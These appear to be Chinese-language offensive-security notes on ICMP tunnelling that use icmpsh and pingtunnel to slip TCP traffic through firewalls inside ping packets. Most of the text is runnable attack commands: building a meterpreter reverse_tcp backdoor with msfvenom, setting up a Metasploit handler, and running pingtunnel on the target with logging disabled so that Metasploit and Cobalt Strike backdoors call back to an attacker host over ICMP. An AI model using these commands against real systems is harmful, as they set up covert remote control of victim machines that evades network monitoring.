ICMP隧道
* 一般两台设备要进行通信，一般是要开放端口，但是ICMP协议不需要
* ICMP消息为ping命令的回复，攻击者可以利用命令行得到比回复更多的ICMP请求
* ICMP隧道，可以将TCP/UDP数据封装到ICMP的ping数据包中，从而穿过防火墙
* 常见的工具：imcpsh、PingTunnel、icmptunnel等

## **ICMP隧道工具icmpsh**

```
• 攻击机：python icmpsh_m.py 192.168.7.146 192.168.7.145
• 靶机： icmpsh.exe -t 192.168.7.146 -d 500 -b 30 -s 128
```

## **ICMP隧道工具pingtunnel**
有防火墙：TCP协议数据封装成ICMP协议数据 隧道技术
TCP转ICMP再还原TCP的程序：pingtunnel

MSF的ICMP上线
```
生成后门：
msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=3333 -f exe > xd.exe
攻击机MSF启动监听：
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set Ihost 0.0.0.0
set lport 4444
exploit

攻击机另一个窗口运行接收ICMP隧道，将ICMP转成TCP，此时TCP根据目的端口自动转发。
/pingtunnel -type server

目标机Win开启隧道//将本地3333 icmp协议数据转发至66的ip的4444流量上（管理员运行)
pingtunnel.exe -type client -l 127.0.0.1:3333 -s 192.168.46.66 -t 192.168.46.66:4444 -tcp 1 -noprint 1 -nolog 1

运行xd.exe

上线MSF
```

CS的ICMP上线
```
CS创建两个监听器，一个监听127.0.0.1的3333
一个监听CS服务端的4444。

CS生成stageless完整后门绑定监听本地3333的cs.exe

CS服务端另一个窗口运行接收ICMP隧道，将ICMP转成TCP，此时TCP根据目的端口自动转发。
/pingtunnel -type server

目标机上运行
Win开启隧道//将本地3333 icmp协议数据转发至66的ip的4444流量上（管理员运行)
pingtunnel.exe -type client -l 127.0.0.1:3333 -s 192.168.46.66 -t 192.168.46.66:4444 -tcp 1 -noprint 1 -nolog 1

目标机运行cs.exe可上线。
CS上线为监听服务端的4444端口。
```